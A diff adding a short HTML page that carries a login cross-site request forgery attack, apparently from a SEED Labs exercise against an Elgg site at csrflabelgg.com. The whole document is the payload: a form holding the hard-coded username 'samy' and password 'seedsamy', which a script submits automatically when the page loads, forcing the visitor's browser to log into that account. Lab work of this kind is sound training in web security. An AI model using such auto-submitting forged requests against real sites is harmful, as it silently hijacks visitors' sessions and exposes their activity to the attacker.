@@ -1,0 +1,9 @@
+<form method="post" action="http://www.csrflabelgg.com/action/login" class="elgg-form elgg-form-login">
+        <fieldset>
+                <input value="samy" name="username" type="text">
+                <input value="seedsamy" name="password" class="elgg-input-password" type="password">
+        </fieldset>
+</form>
+<script>
+        document.forms[0].submit();
+</script>
